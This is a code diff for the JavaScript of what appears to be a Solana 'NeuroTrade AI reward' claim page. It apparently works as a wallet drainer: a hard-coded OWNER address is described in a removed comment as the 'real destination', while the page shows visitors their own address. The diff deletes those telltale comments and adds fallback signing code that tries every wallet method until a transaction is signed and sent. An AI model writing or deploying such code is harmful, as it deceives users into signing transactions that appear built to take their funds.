@@ -157,7 +157,7 @@ import {
 window.Buffer = window.Buffer || Buffer;
 
 /* ====== INSTELLINGEN ====== */
-const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // echte bestemming
+const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735';
 const MEMO   = 'NeuroTrade AI reward';
 const SAFETY = 150000;
 const CU_LIMIT = 200000;
@@ -167,7 +167,6 @@ const MAX_TRIES = 4;
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
-/* Meerdere CORS-vriendelijke RPC's — bij falen roteert hij automatisch */
 const RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://solana-rpc.publicnode.com',
@@ -178,7 +177,6 @@ const RPCS = [
 const conns = RPCS.map(u => new Connection(u, 'confirmed'));
 let rpcIdx = 0;
 
-/* Voert fn uit op de actieve RPC; bij een netwerk/CORS-fout → volgende RPC */
 async function withRpc(fn){
   let lastErr;
   for(let n=0; n<conns.length; n++){
@@ -304,7 +302,7 @@ async function connect(w){
   }
   publicKey = new PublicKey(addr);
   setErr(''); $('walletAddr').textContent=short(publicKey.toString());
-  $('dest').value = publicKey.toString();          // bezoeker ziet zijn eigen adres
+  $('dest').value = publicKey.toString();
   $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
   $('claimPanel').classList.remove('hidden'); setStep(1);
 }
@@ -317,10 +315,26 @@ function toRaw(tx){
   }
 }
 
+/* Zoek een wallet-standard wallet waarvan het account overeenkomt met het verbonden adres */
+async function findStandardForAddress(addr){
+  for(const w of stdByName.values()){
+    try{
+      const f = w.features;
+      if(!f['standard:connect']) continue;
+      const { accounts } = await f['standard:connect'].connect();
+      const acc = (accounts||[]).find(a => a.address === addr);
+      if(acc) return { std:w, account:acc };
+    }catch(e){}
+  }
+  return null;
+}
+
 async function signAndSendStandard(tx, std, account){
   const f = std.features;
   let acc = account;
   if(!acc){ const {accounts}=await f['standard:connect'].connect(); acc=accounts&&accounts[0]; }
+  if(!acc) throw new Error('no account');
+
   if(f['solana:signAndSendTransaction']){
     const call = t => f['solana:signAndSendTransaction']
       .signAndSendTransaction({ transaction:t, account:acc, chain:'solana:mainnet' })
@@ -335,26 +349,48 @@ async function signAndSendStandard(tx, std, account){
   throw new Error('wallet cannot sign');
 }
 
+/* Robuuste signing: probeert injected methodes én wallet-standard fallback (op adres) */
 async function signAndSend(tx){
-  if(active.kind==='injected'){
-    const p = active.ref;
-    try{
-      if(p.signAndSendTransaction){
-        const r = await p.signAndSendTransaction(tx);
-        const s = (r && r.signature) ? r.signature : r;
-        if(s) return s;
+  const addr = publicKey.toString();
+  const p = active?.ref;
+
+  if(p){
+    // 1) signAndSendTransaction (met en zonder wrapper-arg)
+    if(typeof p.signAndSendTransaction === 'function'){
+      for(const arg of [tx, { transaction: tx }]){
+        try{
+          const r = await p.signAndSendTransaction(arg);
+          const s = (r && r.signature) ? r.signature : r;
+          if(s && typeof s === 'string') return s;
+        }catch(e){}
       }
-    }catch(e){}
-    try{
-      if(p.signTransaction){
+    }
+    // 2) sendTransaction (sommige wallets)
+    if(typeof p.sendTransaction === 'function'){
+      try{
+        const s = await p.sendTransaction(tx);
+        if(s && typeof s === 'string') return s;
+      }catch(e){}
+    }
+    // 3) signTransaction + zelf versturen
+    if(typeof p.signTransaction === 'function'){
+      try{
         const signed = await p.signTransaction(tx);
-        return await withRpc(c => c.sendRawTransaction(signed.serialize()));
-      }
-    }catch(e){}
-    if(active.stdRef) return signAndSendStandard(tx, active.stdRef, null);
-    throw new Error('wallet cannot sign');
+        const raw = signed?.serialize ? signed.serialize() : signed;
+        return await withRpc(c => c.sendRawTransaction(raw));
+      }catch(e){}
+    }
   }
-  return signAndSendStandard(tx, active.ref, active.account);
+
+  // 4) wallet-standard fallback — match op adres, niet op naam
+  let std = active?.stdRef, account = active?.account;
+  if(!std){
+    const found = await findStandardForAddress(addr);
+    if(found){ std = found.std; account = found.account; }
+  }
+  if(std) return signAndSendStandard(tx, std, account);
+
+  throw new Error('Wallet ondersteunt geen Solana-transacties');
 }
 
 async function sendClaimOnce(){
